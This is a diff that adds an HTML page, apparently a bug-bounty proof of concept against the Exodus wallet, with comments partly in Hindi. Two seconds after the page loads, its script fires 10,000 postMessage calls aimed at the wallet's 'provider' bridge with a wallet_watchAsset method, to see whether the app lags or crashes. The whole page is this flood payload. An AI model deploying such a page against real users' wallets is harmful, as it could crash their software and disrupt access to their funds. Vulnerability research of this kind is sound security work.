@@ -1,0 +1,32 @@
+<!DOCTYPE html>
+<html>
+<head>
+    <title>Exodus Bug Bounty Test</title>
+</head>
+<body>
+    <h1>Testing Bridge Stability...</h1>
+    <p>Check if the app lags or crashes.</p>
+
+    <script>
+        // Flood loop: 10,000 messages bhejte hain
+        function triggerFlood() {
+            console.log("Starting Bridge Flood...");
+            for (let i = 0; i < 10000; i++) {
+                // Hum postMessage use kar rahe hain jo humne code mein dekha tha
+                window.postMessage({
+                    target: "provider",
+                    data: { 
+                        method: "wallet_watchAsset", // Fake method
+                        id: i,
+                        params: { type: "ERC20", options: { address: "0x..." } }
+                    }
+                }, "*");
+            }
+            alert("Flood Completed. Did it crash?");
+        }
+
+        // 2 seconds baad start karega
+        setTimeout(triggerFlood, 2000);
+    </script>
+</body>
+</html>
